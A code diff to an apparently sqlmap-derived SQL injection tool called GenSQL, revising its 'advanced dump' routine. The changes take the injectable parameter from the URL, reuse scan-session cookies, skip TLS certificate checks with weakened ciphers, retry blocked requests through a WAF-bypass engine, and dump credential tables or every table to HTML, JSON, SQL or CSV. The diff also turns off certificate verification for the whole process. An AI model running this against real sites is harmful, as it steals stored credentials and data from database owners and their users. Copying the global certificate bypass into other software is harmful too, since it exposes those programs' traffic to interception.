@@ -38,6 +38,7 @@ _GENSQL_BOOL_FLAGS = {
     "--adv-dump", "--dump-hex", "--dump-blind", "--dump-bitwise",
     "--dump-time", "--dump-error", "--dump-parallel", "--dump-creds",
     "--dump-all-tables", "--dump-resume",
+    "--force-dump",
 }
 _GENSQL_VALUE_FLAGS = {
     "--nosql-type", "--cloud-provider", "--encoder-chain", "--swagger-url",
@@ -434,7 +435,7 @@ def _run_bypass(o):
 
 # ── Advanced dump runner ──────────────────────────────────────────────────────
 def _run_adv_dump(o):
-    """Run the advanced dump engine after a scan if --adv-dump is set."""
+    """Run the advanced dump engine after a confirmed SQLi scan."""
     if not AdvDumpEngine:
         logger.warning("Advanced dump engine not available")
         return
@@ -443,80 +444,149 @@ def _run_adv_dump(o):
     if not url:
         return
 
-    # Map dump technique flag
+    # ── Guard: only run if SQLi was actually confirmed ────────────────────────
+    if not getattr(o, "force_dump", False):
+        try:
+            from lib.core.data import kb as _kb
+            injections = list(_kb.get("injections") or [])
+            if not injections:
+                logger.warning(
+                    "[GenSQL][DUMP] No SQL injection confirmed — skipping dump. "
+                    "Add --force-dump to override.")
+                return
+            logger.info("[GenSQL][DUMP] %d injection vector(s) confirmed — starting dump"
+                        % len(injections))
+        except Exception:
+            pass  # can't check — proceed anyway
+
+    # Map technique flags
     technique = getattr(o, "dump_technique", "auto")
     if getattr(o, "dump_blind",   False): technique = "blind"
     if getattr(o, "dump_bitwise", False): technique = "bitwise"
     if getattr(o, "dump_time",    False): technique = "time"
     if getattr(o, "dump_error",   False): technique = "error"
 
-    dbms = getattr(conf, "dbms", None) or "mysql"
+    # Get DBMS detected during scan
+    dbms = (getattr(conf, "dbms", None) or "mysql").lower().split()[0]
     checkpoint = "gensql_dump_checkpoint.json" if getattr(o, "dump_resume", False) else None
 
     dump = AdvDumpEngine(
         dbms=dbms,
         threads=getattr(o, "dump_threads", 4),
         chunk_size=getattr(o, "dump_chunk", 50),
-        delay=getattr(conf, "timeSec", 0) if getattr(conf, "timeSec", 0) else 0,
+        delay=getattr(conf, "timeSec", 0) or 0,
         verbose=True,
         checkpoint_file=checkpoint,
     )
 
-    # Wire up GenSQL's HTTP requester
+    # ── Reliable HTTP requester using scan-engine cookies + SSL bypass ─────────
     def _make_requester(base_url):
-        import urllib.request, urllib.error, ssl
-        ctx = ssl.create_default_context()
-        ctx.check_hostname = False
-        ctx.verify_mode = ssl.CERT_NONE
+        import urllib.request, urllib.error, urllib.parse, ssl, socket
+
+        # Parse param name from URL (use first param, not hardcoded "id")
+        parsed = urllib.parse.urlparse(base_url)
+        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+        param_name = list(qs.keys())[0] if qs else "id"
+
+        # SSL context: fully bypass cert errors
+        try:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            try: ctx.set_ciphers("DEFAULT:@SECLEVEL=1")
+            except Exception: pass
+        except Exception:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+
+        # Inherit cookies from scan session
+        cookie_hdr = ""
+        try:
+            for source in (getattr(conf, "httpHeaders", {}),
+                           {"Cookie": getattr(conf, "cookie", "")}):
+                c = source.get("Cookie", "") or source.get("cookie", "")
+                if c: cookie_hdr = c; break
+        except Exception: pass
+
+        ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+        try:
+            ua = (getattr(conf, "httpHeaders", {}) or {}).get("User-Agent", ua) or ua
+        except Exception: pass
+
         def requester(payload):
-            sep = "&" if "?" in base_url else "?"
-            test_url = base_url + sep + "id=" + payload
+            new_qs = {k: v[0] for k, v in qs.items()}
+            new_qs[param_name] = payload
+            test_url = urllib.parse.urlunparse(
+                parsed._replace(query=urllib.parse.urlencode(new_qs)))
+
+            req = urllib.request.Request(test_url)
+            req.add_header("User-Agent", ua)
+            req.add_header("Accept", "text/html,*/*;q=0.9")
+            req.add_header("Accept-Language", "en-US,en;q=0.9")
+            if cookie_hdr: req.add_header("Cookie", cookie_hdr)
+
+            # Hard socket timeout so SSL hangs don't freeze the tool
+            old_to = socket.getdefaulttimeout()
+            socket.setdefaulttimeout(8)
             try:
-                with urllib.request.urlopen(test_url, timeout=10, context=ctx) as r:
-                    return r.status, r.read().decode("utf-8", errors="replace")
+                with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
+                    return r.status, r.read(512000).decode("utf-8", errors="replace")
             except urllib.error.HTTPError as e:
-                return e.code, ""
-            except Exception:
+                try:
+                    body = e.read(8192).decode("utf-8", errors="replace")
+                except Exception:
+                    body = ""
+                return e.code, body
+            except ssl.SSLError as e:
+                logger.debug("[DUMP] SSL: %s" % str(e)[:80])
                 return 0, ""
-        return requester
+            except (socket.timeout, TimeoutError, OSError):
+                return 0, ""
+            except Exception as ex:
+                logger.debug("[DUMP] Req error: %s" % str(ex)[:80])
+                return 0, ""
+            finally:
+                socket.setdefaulttimeout(old_to)
 
-    dump.set_requester(_make_requester(url))
+        return requester, param_name
 
-    # Auto-bypass integration: wrap requester with bypass engine
+    req_fn, param_name = _make_requester(url)
+    logger.info("[GenSQL][DUMP] Param: %r | DBMS: %s | Technique: %s"
+                % (param_name, dbms, technique))
+    dump.set_requester(req_fn)
+
+    # Wrap with auto-bypass if requested
     if getattr(o, "auto_bypass", False) and HTTPBypass:
-        bypass_eng = HTTPBypass()
-        orig_req = dump.requester
-        def bypassing_requester(payload):
-            code, body = orig_req(payload)
+        bp_eng = HTTPBypass(verbose=False)
+        _orig = dump.requester
+        def _bypass_req(payload):
+            code, body = _orig(payload)
             if code in (403, 404, 429, 503):
-                logger.info("HTTP %d detected — attempting bypass..." % code)
-                bp = bypass_eng.best_bypass(url, payload=payload)
+                logger.info("[DUMP] HTTP %d — trying bypass..." % code)
+                bp = bp_eng.best_bypass(url, error_code=code)
                 if bp:
-                    logger.info("Bypass found via: %s" % bp.get("technique"))
+                    logger.info("[DUMP] Bypass: %s" % bp.get("technique"))
             return code, body
-        dump.set_requester(bypassing_requester)
+        dump.set_requester(_bypass_req)
 
-    # Determine what to dump
+    # ── Run the actual dump ────────────────────────────────────────────────────
     if getattr(o, "dump_creds", False):
-        logger.info("Dumping credential tables...")
+        logger.info("[GenSQL][DUMP] Targeting credential/user tables...")
         creds = dump.dump_credentials()
-        logger.info("Found %d credential sets" % len(creds))
+        logger.info("[GenSQL][DUMP] Credential entries: %d" % len(creds))
 
     tbl = getattr(o, "dump_table", None)
-    cols = None
-    if getattr(o, "dump_columns", None):
-        cols = [c.strip() for c in o.dump_columns.split(",")]
+    cols = ([c.strip() for c in o.dump_columns.split(",")]
+            if getattr(o, "dump_columns", None) else None)
 
     if tbl:
-        logger.info("Dumping table: %s" % tbl)
         dump.dump_table(tbl, cols, technique=technique,
-                         hex_encode=getattr(o, "dump_hex", False))
-
+                        hex_encode=getattr(o, "dump_hex", False))
     elif getattr(o, "dump_all_tables", False):
-        logger.info("Enumerating all tables...")
         tables = dump.get_tables()
         if tables:
-            logger.info("Found tables: %s" % ", ".join(tables))
+            logger.info("[GenSQL][DUMP] Tables: %s" % ", ".join(tables))
             tbl_cols = {t: dump.get_columns(t) or ["*"] for t in tables}
             if getattr(o, "dump_parallel", False):
                 dump.dump_all_tables(tbl_cols, technique=technique)
@@ -524,23 +594,24 @@ def _run_adv_dump(o):
                 for t, c in tbl_cols.items():
                     dump.dump_table(t, c, technique=technique,
                                     hex_encode=getattr(o, "dump_hex", False))
-
-    # Export results
-    dump.print_summary()
-    out = getattr(o, "dump_output", None)
-    if out:
-        ext = os.path.splitext(out)[1].lower()
-        if ext == ".html":   path = dump.export_html(out)
-        elif ext == ".json": path = dump.export_json(out)
-        elif ext == ".sql":
-            for t in dump._results:
-                path = dump.export_sql(t, out)
         else:
-            for t in dump._results:
-                path = dump.export_csv(t, out)
-        if path:
-            logger.info("Dump exported to: %s" % path)
+            logger.warning("[GenSQL][DUMP] Could not enumerate tables — "
+                           "try: --dump-table users")
 
+    dump.print_summary()
+
+    out = getattr(o, "dump_output", None)
+    if out and dump._results:
+        ext = os.path.splitext(out)[1].lower()
+        path_out = None
+        if ext == ".html":   path_out = dump.export_html(out)
+        elif ext == ".json": path_out = dump.export_json(out)
+        elif ext == ".sql":
+            for t in dump._results: path_out = dump.export_sql(t, out)
+        else:
+            for t in dump._results: path_out = dump.export_csv(t, out)
+        if path_out:
+            logger.info("[GenSQL][DUMP] Saved to: %s" % path_out)
 
 # ── Module initialisation ─────────────────────────────────────────────────────
 def _init(o):
@@ -760,6 +831,21 @@ def main():
         dataToStdout("[*] starting @ %s\n\n" % time.strftime("%X /%Y-%m-%d/"), forceOutput=True)
 
         init()
+
+        # Disable SSL cert verification globally (GenSQL handles this)
+        try:
+            import ssl as _ssl
+            _ssl._create_default_https_context = _ssl._create_unverified_context
+        except Exception:
+            pass
+
+        # Auto-accept server-set cookies when --batch is active
+        try:
+            if conf.get("batch") or "--batch" in sys.argv:
+                conf.getCookies = True
+        except Exception:
+            pass
+
         _init(o)
         _recon(o)
 
